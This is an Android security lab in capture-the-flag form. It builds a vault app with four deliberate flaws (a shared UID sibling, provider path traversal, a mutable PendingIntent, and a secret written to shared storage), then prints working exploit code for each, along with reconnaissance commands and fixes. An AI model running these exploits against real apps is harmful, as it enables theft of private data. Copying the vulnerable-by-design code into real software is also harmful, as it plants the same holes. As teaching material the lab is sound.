# Lab 05 — CTF: "Escape the Torch"

**Difficulty:** Advanced
**Time:** 3–4 hours
**Prerequisites:** [Lab 01](lab-01-mapping-the-sandbox.md), [Lab 03](lab-03-attacker-app.md),
[Lab 04](lab-04-exported-components.md), [Chapter 21 §3.14 and §5](../README.md#5-security-perspective)

---

## The challenge

Two applications are installed on the device.

**`com.ctf.vault`** stores a flag in its private data directory. Its sandbox is intact: mode `0700`,
its own UID, its own MCS categories, `Seccomp: 2`, empty capabilities. Nothing you do will read that
file directly, and you should not try.

**`com.ctf.torch`** is a flashlight. It is the app *you* control: you may modify it, rebuild it, and
reinstall it as often as you like. It declares no `dangerous` permissions.

**Get the flag into `com.ctf.torch`.**

There are **four independent paths**, in increasing order of subtlety. Find at least two. Then write
down, for each path you used, which property of the sandbox you did *not* violate — because in every
case the sandbox held, and the vault's own configuration was the failure.

Flag format: `SANDBOX{...}`.

---

## Rules

- **No root.** `su`, Magisk, a permissive SELinux domain, and a rooted emulator image are all out. Root
  is outside the sandbox's threat model and solving it that way teaches nothing.
- **No `run-as`.** The vault is built release-signed and non-debuggable, so this should not work anyway;
  if you find it does, your device is a `userdebug` build and you have learned something important
  about test-device selection.
- **No `adb shell` in the final answer.** You may use the shell to *explore*. The flag must arrive in
  `com.ctf.torch`'s own logcat output or on its own screen, obtained by code running as
  `com.ctf.torch`'s UID. That distinction is the entire point of this chapter.
- **No decompiling the vault to read a hardcoded flag.** The flag is generated at first run, so there is
  nothing to read. Decompiling the vault to find its *interfaces* is not only allowed, it is expected.
- You must be able to explain, for each path, which layer of the sandbox was involved. For at least
  three of the four paths, the honest answer is "none".

---

## Building the challenge

Build it yourself. Implementing the mistakes is most of the education, and you will recognise them in
real apps afterwards.

Three Gradle modules: `vault`, `vaulthelper`, `torch`.

### Part 1 — the vault

```kotlin
// vault: src/main/java/com/ctf/vault/VaultApp.kt
package com.ctf.vault

import android.app.Application
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import java.io.File
import java.security.SecureRandom

class VaultApp : Application() {

    override fun onCreate() {
        super.onCreate()

        // The flag is generated once, on first run, so there is nothing to
        // decompile out of the APK.
        val prefs = getSharedPreferences("vault", Context.MODE_PRIVATE)
        if (prefs.getString("flag", null) == null) {
            val n = SecureRandom().nextInt(0xFFFFFF)
            prefs.edit().putString("flag", "SANDBOX{%06x_the_wall_held}".format(n)).apply()
        }
        val flag = prefs.getString("flag", "")!!

        // === MISTAKE 4 (subtlest): a "diagnostic" export the developer forgot.
        // Writes outside the sandbox entirely, guarded by a check that is not a
        // security check.
        if (BuildConfig.DEBUG || getSharedPreferences("vault", 0).getBoolean("diag", true)) {
            runCatching {
                File(getExternalFilesDir(null), "../../../../Documents/vault-diag.txt")
                    .canonicalFile
                    .writeText("build=${BuildConfig.VERSION_NAME}\nrecovery=$flag\n")
            }
        }

        // === MISTAKE 3: a mutable PendingIntent handed out in a broadcast.
        // The recipient can rewrite it and make the VAULT send an Intent of the
        // attacker's choosing, with the vault's identity.
        val callback = Intent("com.ctf.vault.INTERNAL_DELIVER")
            .setPackage(packageName)
        val pi = PendingIntent.getBroadcast(
            this, 0, callback,
            PendingIntent.FLAG_UPDATE_CURRENT          // <-- NOT FLAG_IMMUTABLE
        )
        sendBroadcast(Intent("com.ctf.vault.READY").putExtra("cb", pi))
    }
}
```

```kotlin
// vault: src/main/java/com/ctf/vault/VaultProvider.kt
package com.ctf.vault

import android.content.ContentProvider
import android.content.ContentValues
import android.database.Cursor
import android.database.MatrixCursor
import android.net.Uri
import android.os.ParcelFileDescriptor
import java.io.File
import java.io.FileNotFoundException

/**
 * MISTAKE 2: exported with no permission, and openFile() concatenates a
 * caller-supplied segment. query() itself is guarded — the developer thought
 * about that one. openFile() was added later, by someone else, in a hurry.
 */
class VaultProvider : ContentProvider() {

    override fun onCreate() = true

    override fun query(uri: Uri, p: Array<String>?, s: String?,
                       sa: Array<String>?, so: String?): Cursor =
        MatrixCursor(arrayOf("name", "size")).apply {
            File(context!!.filesDir, "public").listFiles()?.forEach {
                addRow(arrayOf(it.name, it.length()))
            }
        }

    override fun openFile(uri: Uri, mode: String): ParcelFileDescriptor {
        val seg = uri.lastPathSegment ?: throw FileNotFoundException("no segment")
        // "public/ is the only directory we serve" — except .. is a path segment too.
        val f = File(File(context!!.filesDir, "public"), seg)
        return ParcelFileDescriptor.open(f, ParcelFileDescriptor.MODE_READ_ONLY)
    }

    override fun getType(uri: Uri) = "application/octet-stream"
    override fun insert(uri: Uri, v: ContentValues?): Uri? = null
    override fun delete(uri: Uri, s: String?, sa: Array<String>?) = 0
    override fun update(uri: Uri, v: ContentValues?, s: String?, sa: Array<String>?) = 0
}
```

```kotlin
// vault: src/main/java/com/ctf/vault/DeliverReceiver.kt
package com.ctf.vault

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent

/**
 * The vault's own receiver for the callback above. It reads the flag and puts
 * it into the result — and the PendingIntent that reaches it is mutable, so an
 * attacker can redirect where the result goes.
 */
class DeliverReceiver : BroadcastReceiver() {
    override fun onReceive(ctx: Context, intent: Intent) {
        val flag = ctx.getSharedPreferences("vault", 0).getString("flag", "")
        val out = Intent(intent).putExtra("payload", flag)
        // The vault forwards using ITS OWN identity. Where it goes is decided by
        // the (rewritten) PendingIntent, not by the vault.
        runCatching { ctx.sendBroadcast(out) }
    }
}
```

```xml
<!-- vault: AndroidManifest.xml -->
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.ctf.vault">

    <!-- MISTAKE 1: a shared UID with a helper app nobody maintains. -->
    <application
        android:name=".VaultApp"
        android:allowBackup="false"
        android:label="Vault">

        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <!-- MISTAKE 2 -->
        <provider
            android:name=".VaultProvider"
            android:authorities="com.ctf.vault.files"
            android:exported="true" />

        <!-- MISTAKE 3's landing point -->
        <receiver android:name=".DeliverReceiver" android:exported="false">
            <intent-filter>
                <action android:name="com.ctf.vault.INTERNAL_DELIVER" />
            </intent-filter>
        </receiver>
    </application>
</manifest>
```

Add `android:sharedUserId="com.ctf.suite"` to the `<manifest>` element of **both** the vault and the
helper below. (Modern tooling will warn that it is deprecated. That is the point — it is deprecated and
still shipping in real apps, because removing it orphans installed users' data.)

### Part 2 — the neglected sibling

```xml
<!-- vaulthelper: AndroidManifest.xml -->
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.ctf.vaulthelper"
    android:sharedUserId="com.ctf.suite">

    <application android:label="Vault Updater" android:allowBackup="false">
        <!-- MISTAKE 1: an unprotected exported service in the SIBLING.
             It has no secrets of its own, so nobody thought about it. It has
             the vault's UID, so it can read everything the vault can. -->
        <service android:name=".UpdateService" android:exported="true" />
    </application>
</manifest>
```

```kotlin
// vaulthelper: src/main/java/com/ctf/vaulthelper/UpdateService.kt
package com.ctf.vaulthelper

import android.app.Service
import android.content.Intent
import android.os.*
import java.io.File

/**
 * A generic "read a config file and tell me what's in it" helper. Harmless in
 * isolation. It runs as the SHARED UID, so "our own files" includes the vault's.
 */
class UpdateService : Service() {

    private val handler = object : Handler(Looper.getMainLooper()) {
        override fun handleMessage(msg: Message) {
            val path = msg.data.getString("path") ?: return
            val reply = Message.obtain(null, 1)
            reply.data = Bundle().apply {
                putString("content", runCatching { File(path).readText() }
                    .getOrElse { "ERR ${it.javaClass.simpleName}" })
            }
            runCatching { msg.replyTo?.send(reply) }
        }
    }

    override fun onBind(intent: Intent): IBinder = Messenger(handler).binder
}
```

Both APKs **must be signed with the same key** or the platform will refuse to install the second one —
which is itself a good thing to observe once, deliberately.

```bash
# host — one debug keystore for both, so they share a signing identity
./gradlew :vault:assembleRelease :vaulthelper:assembleRelease :torch:assembleDebug
```

### Part 3 — the torch

```xml
<!-- torch: AndroidManifest.xml -->
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.ctf.torch">

    <uses-permission android:name="android.permission.INTERNET" />

    <!-- Without this, the vault is invisible and every probe reads ABSENT. -->
    <queries>
        <package  android:name="com.ctf.vault" />
        <package  android:name="com.ctf.vaulthelper" />
        <provider android:authorities="com.ctf.vault.files" />
    </queries>

    <application android:label="Torch" android:allowBackup="false">
        <activity android:name=".TorchActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <!-- For path 3: where a redirected result can land. -->
        <receiver android:name=".Catcher" android:exported="true">
            <intent-filter android:priority="2147483647">
                <action android:name="com.ctf.vault.READY" />
                <action android:name="com.ctf.torch.CAUGHT" />
            </intent-filter>
        </receiver>
    </application>
</manifest>
```

Everything else in `torch` is yours to write. That is the challenge.

### Install

```bash
# host
adb install -r vault/build/outputs/apk/release/vault-release.apk
adb install -r vaulthelper/build/outputs/apk/release/vaulthelper-release.apk
adb install -r torch/build/outputs/apk/debug/torch-debug.apk

adb shell am start -n com.ctf.vault/.MainActivity     # generate the flag
adb logcat -c
```

Confirm the wall is standing before you start:

```bash
# adb shell
ls -ld /data/data/com.ctf.vault      # Permission denied
pm list packages -U | grep ctf       # note the UIDs carefully
```

---

## Reconnaissance

Do this before attempting anything. Every path below is discoverable from the outside.

```bash
# host
apktool d -f vault-release.apk       -o vault_work/       >/dev/null
apktool d -f vaulthelper-release.apk -o helper_work/      >/dev/null
grep -nE 'sharedUserId|exported="true"|authorities|PendingIntent' vault_work/AndroidManifest.xml helper_work/AndroidManifest.xml
jadx -d vault_out  vault-release.apk
jadx -d helper_out vaulthelper-release.apk
grep -rn 'PendingIntent\|openFile\|getExternalFilesDir' vault_out/sources/
```

```bash
# adb shell
pm list packages -U | grep ctf
dumpsys package com.ctf.vault       | grep -iE 'userId|sharedUser|gids'
dumpsys package com.ctf.vaulthelper | grep -iE 'userId|sharedUser|gids'
```

**The single most important observation in this entire lab is available from that last pair of
commands.** Make it before you read any further.

---

## The four paths

Each is a genuinely different mistake. Do not read a section until you have tried it.

<details>
<summary>Path 1 — the <code>sharedUserId</code> sibling (easiest)</summary>

The vault and the helper report **the same UID**. They are the same Unix user: same data tree, same
SELinux domain, same MCS categories. Whatever the helper can read, the vault's files are included,
because from the kernel's point of view there is only one app here.

The helper exports an unprotected `Messenger` service that reads a caller-supplied path and returns the
contents. It has no secrets of its own, so nobody thought about it.

From the torch:

```kotlin
val conn = object : ServiceConnection {
    override fun onServiceConnected(n: ComponentName, b: IBinder) {
        val remote = Messenger(b)
        val replyTo = Messenger(object : Handler(Looper.getMainLooper()) {
            override fun handleMessage(m: Message) {
                Log.w("TORCH", "PATH1 -> " + m.data.getString("content"))
            }
        })
        val msg = Message.obtain(null, 1).apply {
            data = Bundle().apply {
                putString("path", "/data/data/com.ctf.vault/shared_prefs/vault.xml")
            }
            this.replyTo = replyTo
        }
        remote.send(msg)
    }
    override fun onServiceDisconnected(n: ComponentName) {}
}
bindService(
    Intent().setComponent(ComponentName("com.ctf.vaulthelper",
        "com.ctf.vaulthelper.UpdateService")),
    conn, Context.BIND_AUTO_CREATE)
```

**Sandbox property not violated:** the DAC and SELinux checks both passed — for the *helper*, which is
entitled to read those files because it holds the same UID. The torch never touched the vault's data
directory. The failure is that two apps were deliberately merged into one sandbox and only one of them
was hardened.

This is why `sharedUserId` must be grepped for on every engagement: **the weakest member of a shared
UID group defines the security of every member.**
</details>

<details>
<summary>Path 2 — the provider traversal</summary>

`VaultProvider.openFile()` builds `File(File(filesDir, "public"), uri.lastPathSegment)` with no
canonicalisation. The developer reasoned that `public/` is the only directory served. `..` is a path
segment.

```kotlin
val base = Uri.parse("content://com.ctf.vault.files")
listOf(
    "../../shared_prefs/vault.xml",
    "../../../shared_prefs/vault.xml"
).forEach { seg ->
    runCatching {
        contentResolver.openInputStream(Uri.withAppendedPath(base, seg))!!
            .bufferedReader().readText()
    }.onSuccess { Log.w("TORCH", "PATH2 -> $it") }
     .onFailure { Log.w("TORCH", "PATH2 $seg -> ${it.javaClass.simpleName}") }
}
```

If `withAppendedPath` normalises your payload away, build the URI from a full string, or URL-encode the
separators, and log `uri.lastPathSegment` inside the vault to see what actually arrived.

**Sandbox property not violated:** none, again. The **vault's** process called `open()` under the
vault's own UID and SELinux context; both kernel checks passed correctly at that moment. The resulting
descriptor was handed to the torch across Binder, and the kernel does not recheck reads through an
already-open descriptor. This is escape class 5, file-descriptor leaks across the boundary — the same
mechanism that makes descriptor passing to an isolated process work in
[Lab 02](lab-02-isolated-process.md).

Note what it *cannot* reach: anything the vault itself cannot read. The bug grants the vault's read
authority, not root.
</details>

<details>
<summary>Path 3 — the mutable <code>PendingIntent</code> (hardest)</summary>

The vault broadcasts `com.ctf.vault.READY` with a `PendingIntent` extra created **without**
`FLAG_IMMUTABLE`. The broadcast is unprotected, so the torch's maximum-priority receiver gets it.

> **Definition — `PendingIntent`**
> A token that lets another application later perform an operation **as the creating application**,
> with the creator's identity and permissions. A *mutable* `PendingIntent` additionally lets the holder
> fill in unspecified fields of the wrapped `Intent` before it is sent.

So the torch: catches the broadcast, takes the `PendingIntent`, fills in fields the vault left blank,
and sends it. The vault's own `DeliverReceiver` runs, reads the flag, and forwards the result to
wherever the (now attacker-influenced) `Intent` points — which is the torch.

```kotlin
class Catcher : BroadcastReceiver() {
    override fun onReceive(ctx: Context, intent: Intent) {
        intent.getStringExtra("payload")?.let {
            Log.w("TORCH", "PATH3 -> $it"); return
        }
        val pi = intent.getParcelableExtra<PendingIntent>("cb") ?: return
        // Fill in what the vault left unspecified. The send happens with the
        // VAULT's identity, not ours.
        val fillIn = Intent("com.ctf.torch.CAUGHT")
            .setPackage("com.ctf.torch")
        runCatching { pi.send(ctx, 0, fillIn) }
            .onFailure { Log.w("TORCH", "PATH3 send failed: $it") }
    }
}
```

**Sandbox property not violated:** none. Every process stayed in its own UID throughout. The vault
voluntarily handed out a capability to act with its identity and did not restrict what could be done
with it. This is the confused-deputy pattern, and it is exactly why `FLAG_IMMUTABLE` became mandatory
for apps targeting API 31 and above — which is a strong hint about what the *fix* is, and about which
`targetSdk` values this path works against.
</details>

<details>
<summary>Path 4 — the artefact outside the sandbox (subtlest)</summary>

`VaultApp.onCreate` writes a "diagnostics" file. Read the path carefully:

```kotlin
File(getExternalFilesDir(null), "../../../../Documents/vault-diag.txt").canonicalFile
```

`getExternalFilesDir()` returns `/storage/emulated/0/Android/data/com.ctf.vault/files`. Four levels up
is `/storage/emulated/0`, so the file lands in `/storage/emulated/0/Documents/vault-diag.txt` — **shared
storage**, outside every part of the sandbox — and it contains `recovery=SANDBOX{...}`.

The guard `BuildConfig.DEBUG || prefs.getBoolean("diag", true)` looks like a debug-only path. It is
not: the second clause defaults to `true`, so it runs in release builds too. This shape — a
"debug-only" feature whose guard has a second branch nobody re-read — is extremely common in real code.

From the torch, at `targetSdk` 29+, the file is not directly listable, but it is discoverable through
`MediaStore` because it is in a public collection:

```kotlin
val proj = arrayOf(MediaStore.Files.FileColumns._ID, MediaStore.Files.FileColumns.DISPLAY_NAME)
contentResolver.query(
    MediaStore.Files.getContentUri("external"), proj,
    "${MediaStore.Files.FileColumns.DISPLAY_NAME} = ?", arrayOf("vault-diag.txt"), null
)?.use { c ->
    while (c.moveToNext()) {
        val uri = ContentUris.withAppendedId(
            MediaStore.Files.getContentUri("external"), c.getLong(0))
        runCatching {
            contentResolver.openInputStream(uri)!!.bufferedReader().readText()
        }.onSuccess { Log.w("TORCH", "PATH4 -> $it") }
    }
}
```

Depending on your Android version and the file's collection, this may require `READ_EXTERNAL_STORAGE`
(API ≤ 32) or `READ_MEDIA_*` (API 33+) — and *that requirement is part of the finding*. State it.

**Sandbox property not violated:** none. The data was never in the sandbox. And the sharpest
observation available here: uninstalling the vault does **not** remove this file. Data written to shared
storage has left the sandbox permanently, and can be inherited by whatever app later receives the
vault's recycled appId.
</details>

---

## Questions

Answer these regardless of which paths you solved.

**Question 1.** For each path you completed, name the sandbox mechanism that was defeated. If your
answer for a path is not "none", re-read the path.

**Question 2.** Rank the four paths by severity and justify the ranking. State the prerequisite for
each — what must be true of the attacker, the device, the target's `targetSdk`, and the user.

**Question 3.** Path 1 requires a second installed app. Is that a realistic prerequisite? Under what
circumstances is it *guaranteed* to be satisfied?

**Question 4.** Path 3 stopped working when you rebuilt the vault at `targetSdk 31` or above. Why?
Exactly what does the platform do differently, and is the underlying design mistake fixed or merely
made harder?

**Question 5.** Path 4 involves shared storage. Rebuild the vault at `targetSdk 28`,
`targetSdk 29 + requestLegacyExternalStorage`, and `targetSdk 34`, and record how the result changes in
each. What does that tell you about writing storage findings without stating the target SDK?

**Question 6.** You have the flag. Write the executive summary paragraph — three sentences — for a
client whose engineer will argue that "the Android sandbox protects our data". You must be both correct
and non-adversarial.

**Question 7.** Write the four remediations as code or manifest changes, not as prose advice.

**Question 8.** One realistic mitigation would have blunted **three** of the four paths at once without
touching any of the individual bugs. What is it, and why does it not help with the fourth?

---

## Hints

<details>
<summary>Hint 1 — where to start</summary>

Compare the UIDs. That single `pm list packages -U | grep ctf` output contains the whole of path 1, and
it takes three seconds. Recon before exploitation, always.
</details>

<details>
<summary>Hint 2 — everything reads ABSENT / NameNotFoundException</summary>

Your `<queries>` block. It must name both packages **and** the provider authority. Providers need the
`<provider android:authorities="…">` entry; declaring the package alone is not enough to resolve a
`content://` URI. This is the single most common self-inflicted false negative in probe apps.
</details>

<details>
<summary>Hint 3 — path 2 keeps returning FileNotFoundException</summary>

Count your `..` segments from `filesDir/public`, not from the data directory root. Then check whether
`Uri` normalisation ate them: log `uri.lastPathSegment` inside the vault and see what actually arrived.
If the vault used `uri.path` instead of `uri.lastPathSegment`, your payload shape is entirely
different — read the decompiled `openFile` rather than guessing.
</details>

<details>
<summary>Hint 4 — path 3: the broadcast never arrives</summary>

Three things to check. Your receiver must be exported and registered for the exact action string.
Manifest-declared receivers for implicit broadcasts are restricted from API 26, so register
`Catcher` dynamically with `registerReceiver()` from a foreground activity instead. And the vault sends
the broadcast in `Application.onCreate` — so start the torch first, and *then* force-stop and relaunch
the vault:

```bash
# adb shell
am force-stop com.ctf.vault
am start -n com.ctf.vault/.MainActivity
```
</details>

<details>
<summary>Hint 5 — path 3: <code>pi.send()</code> throws</summary>

`PendingIntent.CanceledException` means the vault's process died and took the token with it — re-catch
a fresh one. A `SecurityException` means it was created `FLAG_IMMUTABLE` after all; check the vault's
build. And remember you can only fill in fields the creator left **unspecified**: if the vault set an
explicit component on the wrapped Intent, your `fillIn` component is ignored, and you must redirect
through some other unspecified field.
</details>

<details>
<summary>Hint 6 — path 4: you cannot find the file</summary>

First confirm it exists at all (this is exploration, so the shell is fine here — just do not put it in
the answer):

```bash
# adb shell
ls -l /storage/emulated/0/Documents/ | grep vault
```

If it is absent, the vault's write failed under scoped storage — which is a result. Rebuild the vault
at `targetSdk 28` and observe the difference. If it exists but `MediaStore` does not return it, the
media scanner has not indexed it; trigger a scan, or check whether your app needs a media permission on
your API level.
</details>

---

## Solution

<details>
<summary>Answers</summary>

**1.** None, on any path. Path 1: DAC and SELinux both passed, for a process legitimately holding that
UID. Path 2: the vault opened its own file with its own authority and passed a descriptor. Path 3:
every process stayed in its own UID; the vault volunteered a capability to act as itself. Path 4: the
data was never inside the sandbox.

The unifying sentence is the one the whole chapter builds towards: **the sandbox held in all four
cases.** The failures were configuration, not containment.

**2.** A defensible ranking:

| Path | Severity | Prerequisite |
|---|---|---|
| 2 — provider traversal | **High** | Attacker app installed; `<queries>` entry; no user interaction; no permission. Yields the vault's entire read authority, not just the flag. |
| 1 — `sharedUserId` sibling | **High** | The sibling must be installed. Often guaranteed (see Q3). Yields the same read authority via a different route. |
| 3 — mutable `PendingIntent` | **Medium** | Attacker app installed; vault must target below API 31; requires catching a broadcast, so a timing/lifecycle dependency. Yields exactly what the deputy will hand over. |
| 4 — shared-storage artefact | **Medium / High**, version-dependent | May require `READ_EXTERNAL_STORAGE` or `READ_MEDIA_*`, which is a user-visible prompt. But it **survives uninstall**, which pushes it up. |

Severity comes from what the door reaches, not from the fact that it opened.

**3.** Very realistic, and in one case guaranteed. Vendors ship suites — a banking app and its updater,
a messenger and its stickers app, a launcher and its widget provider — and they are frequently
installed together by the OEM or bundled by the vendor's own installer. If the sibling is a *system*
app the user cannot uninstall, the prerequisite is satisfied on every device permanently.

Also note the asymmetry that makes this class so productive: the hardened app gets the security review;
the "harmless" helper does not.

**4.** From API 31, a `PendingIntent` must be created with either `FLAG_IMMUTABLE` or `FLAG_MUTABLE`
explicitly — creating one without either throws `IllegalArgumentException`. This forces the developer
to make a conscious choice rather than inheriting a dangerous default.

It is *not* fixed, merely made deliberate. `FLAG_MUTABLE` still exists and is still legitimately
needed (inline notification replies, for example). So a target that targets API 31+ and still passes
`FLAG_MUTABLE` with an under-specified wrapped `Intent` is exactly as vulnerable as this one. Check the
flag, not the target SDK.

**5.** At `targetSdk 28` the write to `/storage/emulated/0/Documents/` succeeds and the file is broadly
readable with `READ_EXTERNAL_STORAGE`. At `targetSdk 29` with `requestLegacyExternalStorage="true"`,
the same. At `targetSdk 30+` the direct path write is refused by scoped storage and the app would need
`MediaStore` or the Storage Access Framework — so on a modern target this leak may not occur at all.

The lesson: a storage finding without a stated `targetSdkVersion` is not a finding, it is a guess. This
is also why §11.2 lists "assuming pre-Android-11 storage semantics" as a pentester mistake, and why you
should test at both the app's `minSdk` and its `targetSdk`.

**6.** Something close to:

> "The Android application sandbox operated correctly throughout this assessment. At no point was an
> unprivileged application able to read the vault's private data directory, observe its process, or
> influence its execution through any platform mechanism. The four issues below all concern data the
> application placed outside that boundary, or interfaces it deliberately exposed to other
> applications — categories the sandbox was never designed to cover, and which are therefore entirely
> within the development team's control."

**7.**

```xml
<!-- Path 1: stop sharing a UID. -->
<manifest ...
    android:sharedUserId="com.ctf.suite"
    android:sharedUserMaxSdkVersion="32">
<!-- New installs get their own UID; existing installs keep their data. Then
     protect the sibling's service in the meantime: -->
<service android:name=".UpdateService" android:exported="false" />
```

```kotlin
// Path 2: canonicalise, then verify containment AFTER resolution, including
// the separator so /public-backup does not match /public.
override fun openFile(uri: Uri, mode: String): ParcelFileDescriptor {
    if (mode != "r") throw SecurityException("read-only")
    val root   = File(context!!.filesDir, "public").canonicalFile
    val target = File(root, uri.lastPathSegment ?: throw FileNotFoundException()).canonicalFile
    if (!target.path.startsWith(root.path + File.separator))
        throw SecurityException("path escapes the export root")
    return ParcelFileDescriptor.open(target, ParcelFileDescriptor.MODE_READ_ONLY)
}
// Better still: delete this provider and use androidx FileProvider with a
// <paths> allowlist and per-URI FLAG_GRANT_READ_URI_PERMISSION grants.
```

```kotlin
// Path 3: immutable, explicit, and not broadcast to the world.
val pi = PendingIntent.getBroadcast(
    this, 0,
    Intent("com.ctf.vault.INTERNAL_DELIVER")
        .setComponent(ComponentName(this, DeliverReceiver::class.java)),
    PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
sendBroadcast(Intent("com.ctf.vault.READY")
    .putExtra("cb", pi)
    .setPackage(packageName))            // explicit target, not a world broadcast
```

```kotlin
// Path 4: never write secrets outside the sandbox, and never let a "debug"
// guard default to true.
if (BuildConfig.DEBUG) {
    File(filesDir, "diag.txt").writeText("build=${BuildConfig.VERSION_NAME}\n")  // no flag
}
```

**8.** **Not writing the flag anywhere the app itself can hand it out.** Concretely: keep it in the
Android Keystore and derive/verify rather than store, so that even code running as the vault's UID gets
a handle rather than the secret — see [49-KeyStore](../../49-KeyStore/README.md).

That blunts paths 1, 2 and 4, because all three ultimately depend on *reading the vault's stored bytes*
by one route or another, and there would be no bytes to read.

It does **not** help with path 3, because path 3 does not read anything. It makes the vault *use* the
secret and hand the result over voluntarily. That is the same distinction the Keystore chapter is built
on: the Keystore prevents key **extraction**, never key **use**. An attacker who can make privileged
code act on their behalf does not need the secret at all.

</details>

---

## Success criteria

- [ ] You obtained the flag inside `com.ctf.torch`, from code running as the torch's own UID
- [ ] You did it without root, without `run-as`, and without `adb shell` in the final answer
- [ ] You solved **at least two** of the four paths independently
- [ ] For each path you solved, you can name the mechanism that failed — and the answer is "none of the
      sandbox's"
- [ ] You ranked the four paths by severity with the prerequisite for each stated explicitly
- [ ] You rebuilt the vault at a different `targetSdk` and observed at least one path change behaviour
- [ ] You wrote the four remediations as code, not as advice
- [ ] You identified the single mitigation that addresses three paths, and explained precisely why it
      does nothing for the fourth
- [ ] You can explain, to a developer who believes the sandbox protects their data, why they are both
      right and about to be breached
